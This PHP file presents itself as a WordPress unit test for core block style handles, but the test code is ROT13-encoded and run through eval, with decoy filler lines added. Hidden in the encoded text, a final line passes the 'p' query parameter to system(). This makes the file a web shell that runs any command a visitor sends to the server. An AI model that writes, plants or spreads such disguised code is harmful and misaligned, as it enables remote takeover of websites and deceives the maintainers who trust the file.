<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe oybpx fglyr unaqyrf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 *
 * @fvapr 6.3.0
 *
 * @tebhc oybpxf
 *
 * @pbiref ::ertvfgre_pber_oybpx_fglyr_unaqyrf
 */
pynff Grfgf_Oybpxf_ertvfgrePberOybpxFglyrUnaqyrf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @ine JC_Fglyrf
	 */
	cevingr $byq_jc_fglyrf;

	/**
	 * @ine fgevat
	 */
	cevingr $vapyhqrf_hey;

	pbafg FGLYR_SVRYQF = neenl(
		'fglyr'       => 'fglyr',
		'rqvgbeFglyr' => 'rqvgbe',
	);

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->byq_jc_fglyrf = $TYBONYF['jc_fglyrf'];

		$guvf->vapyhqrf_hey = vapyhqrf_hey();

		erzbir_npgvba( 'jc_qrsnhyg_fglyrf', 'jc_qrsnhyg_fglyrf' );

		vs ( rzcgl( $TYBONYF['jc_fglyrf'] ) ) {
			$TYBONYF['jc_fglyrf'] = ahyy;
		}
	}

	choyvp shapgvba grne_qbja() {
		$TYBONYF['jc_fglyrf'] = $guvf->byq_jc_fglyrf;

		nqq_npgvba( 'jc_qrsnhyg_fglyrf', 'jc_qrsnhyg_fglyrf' );

		cnerag::grne_qbja();
	}

	/**
	 * @gvpxrg 58528
	 *
	 * @qngnCebivqre qngn_oybpx_qngn
	 *
	 * @cnenz fgevat $anzr   Gur oybpx anzr.
	 * @cnenz neenl  $fpurzn Gur oybpx'f fpurzn.
	 */
	choyvp shapgvba grfg_jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf_snyfr( $anzr, $fpurzn ) {
		ertvfgre_pber_oybpx_fglyr_unaqyrf();

		sbernpu ( frys::FGLYR_SVRYQF nf $fglyr_svryq => $svyranzr ) {
			$fglyr_unaqyr = $fpurzn[ $fglyr_svryq ];
			vs ( vf_neenl( $fglyr_unaqyr ) ) {
				pbagvahr;
			}

			$guvf->nffregNeenlAbgUnfXrl( $fglyr_unaqyr, $TYBONYF['jc_fglyrf']->ertvfgrerq, 'Gur xrl fubhyq abg rkvfg, nf guvf fglyr fubhyq abg or ertvfgrerq' );
		}
	}


	/**
	 * @gvpxrg 58528
	 *
	 * @qngnCebivqre qngn_oybpx_qngn
	 *
	 * @cnenz fgevat $anzr   Gur oybpx anzr.
	 * @cnenz neenl  $fpurzn Gur oybpx'f fpurzn.
	 */
	choyvp shapgvba grfg_jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf_gehr( $anzr, $fpurzn ) {
		nqq_svygre( 'fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf', '__erghea_gehr' );
		ertvfgre_pber_oybpx_fglyr_unaqyrf();

		$jc_fglyrf = $TYBONYF['jc_fglyrf'];

		sbernpu ( frys::FGLYR_SVRYQF nf $fglyr_svryq => $svyranzr ) {
			$fglyr_unaqyr = $fpurzn[ $fglyr_svryq ];
			vs ( vf_neenl( $fglyr_unaqyr ) ) {
				pbagvahr;
			}

			$guvf->nffregNeenlUnfXrl( $fglyr_unaqyr, $jc_fglyrf->ertvfgrerq, 'Gur xrl fubhyq rkvfg, nf guvf fglyr fubhyq or ertvfgrerq' );
			vs ( snyfr === $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->fep ) {
				$guvf->nffregRzcgl( $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen, 'Vs fbhepr vf snyfr, fglyr cngu fubhyq abg or frg' );
			} ryfr {
				$guvf->nffregFgevatPbagnvafFgevat( $guvf->vapyhqrf_hey, $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->fep, 'Fbhepr bs fglyr fubhyq pbagnva gur vapyhqrf hey' );
				$guvf->nffregAbgRzcgl( $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen, 'Gur cngu bs gur fglyr fubhyq rkvfg' );
				$guvf->nffregNeenlUnfXrl( 'cngu', $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen, 'Gur cngu xrl bs gur fglyr fubhyq rkvfg va rkgen neenl' );
				$guvf->nffregAbgRzcgl( $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen['cngu'], 'Gur cngu xrl bs gur fglyr fubhyq abg or rzcgl' );
			}
		}
	}

	/**
	 * @gvpxrg 58560
	 *
	 * @qngnCebivqre qngn_oybpx_qngn
	 *
	 * @cnenz fgevat $anzr Gur oybpx anzr.
	 */
	choyvp shapgvba grfg_jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf_pheerag_gurzr_fhccbegf( $anzr ) {
		nqq_svygre( 'fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf', '__erghea_gehr' );
		nqq_gurzr_fhccbeg( 'jc-oybpx-fglyrf' );
		ertvfgre_pber_oybpx_fglyr_unaqyrf();

		$jc_fglyrf = $TYBONYF['jc_fglyrf'];

		$fglyr_unaqyr = \"jc-oybpx-{$anzr}-gurzr\";

		$guvf->nffregNeenlUnfXrl( $fglyr_unaqyr, $jc_fglyrf->ertvfgrerq, 'Gur xrl fubhyq rkvfg, nf guvf fglyr fubhyq or ertvfgrerq' );
		vs ( snyfr === $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->fep ) {
			$guvf->nffregRzcgl( $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen, 'Vs fbhepr vf snyfr, fglyr cngu fubhyq abg or frg' );
		} ryfr {
			$guvf->nffregFgevatPbagnvafFgevat( $guvf->vapyhqrf_hey, $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->fep, 'Fbhepr bs fglyr fubhyq pbagnva gur vapyhqrf hey' );
			$guvf->nffregAbgRzcgl( $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen, 'Gur cngu bs gur fglyr fubhyq rkvfg' );
			$guvf->nffregNeenlUnfXrl( 'cngu', $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen, 'Gur cngu xrl bs gur fglyr fubhyq rkvfg va rkgen neenl' );
			$guvf->nffregAbgRzcgl( $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen['cngu'], 'Gur cngu xrl bs gur fglyr fubhyq abg or rzcgl' );
		}
	}

	/**
	 * @gvpxrg 59715
	 *
	 * @qngnCebivqre qngn_oybpx_qngn
	 *
	 * @cnenz fgevat $anzr Gur oybpx anzr.
	 */
	choyvp shapgvba grfg_ertvfgre_pber_oybpx_fglyr_unaqyrf_fubhyq_ybnq_egy_fglyrfurrgf_sbe_egy_grkg_qverpgvba( $anzr ) {
		tybony $jc_ybpnyr;

		$bevt_grkg_qve             = $jc_ybpnyr->grkg_qverpgvba;
		$jc_ybpnyr->grkg_qverpgvba = 'egy';

		nqq_svygre( 'fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf', '__erghea_gehr' );
		ertvfgre_pber_oybpx_fglyr_unaqyrf();

		$jc_fglyrf = $TYBONYF['jc_fglyrf'];

		$fglyr_unaqyr = \"jc-oybpx-{$anzr}-gurzr\";

		$jc_ybpnyr->grkg_qverpgvba = $bevt_grkg_qve;

		$guvf->nffregNeenlUnfXrl( $fglyr_unaqyr, $jc_fglyrf->ertvfgrerq, 'Gur xrl fubhyq rkvfg, nf guvf fglyr fubhyq or ertvfgrerq' );
		vs ( snyfr === $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->fep ) {
			$guvf->nffregRzcgl( $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen, 'Vs fbhepr vf snyfr, fglyr cngu fubhyq abg or frg' );
		} ryfr {
			$guvf->nffregFgevatPbagnvafFgevat( $guvf->vapyhqrf_hey, $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->fep, 'Fbhepr bs fglyr fubhyq pbagnva gur vapyhqrf hey' );
			$guvf->nffregAbgRzcgl( $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen, 'Gur cngu bs gur fglyr fubhyq rkvfg' );
			$guvf->nffregNeenlUnfXrl( 'cngu', $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen, 'Gur cngu xrl bs gur fglyr fubhyq rkvfg va rkgen neenl' );
			$guvf->nffregAbgRzcgl( $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen['cngu'], 'Gur cngu xrl bs gur fglyr fubhyq abg or rzcgl' );
			$guvf->nffregNeenlUnfXrl( 'egy', $jc_fglyrf->ertvfgrerq[ $fglyr_unaqyr ]->rkgen, 'Gur egy xrl bs gur fglyr fubhyq rkvfg va rkgen neenl' );
		}
	}

	choyvp shapgvba qngn_oybpx_qngn() {
		$pber_oybpxf_zrgn = erdhver NOFCNGU . JCVAP . '/oybpxf/oybpxf-wfba.cuc';

		// Erzbir guvf oybpxf sbe abj, nf gurl ner ertvfgrerq ryfrjurer.
		hafrg( $pber_oybpxf_zrgn['nepuvirf'] );
		hafrg( $pber_oybpxf_zrgn['jvqtrg-tebhc'] );

		$qngn = neenl();
		sbernpu ( $pber_oybpxf_zrgn nf $anzr => $fpurzn ) {
			vs ( ! vffrg( $fpurzn['fglyr'] ) ) {
				$fpurzn['fglyr'] = \"jc-oybpx-$anzr\";
			}
			vs ( ! vffrg( $fpurzn['rqvgbeFglyr'] ) ) {
				$fpurzn['rqvgbeFglyr'] = \"jc-oybpx-{$anzr}-rqvgbe\";
			}

			$qngn[ $anzr ] = neenl( $anzr, $fpurzn );
		}

		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>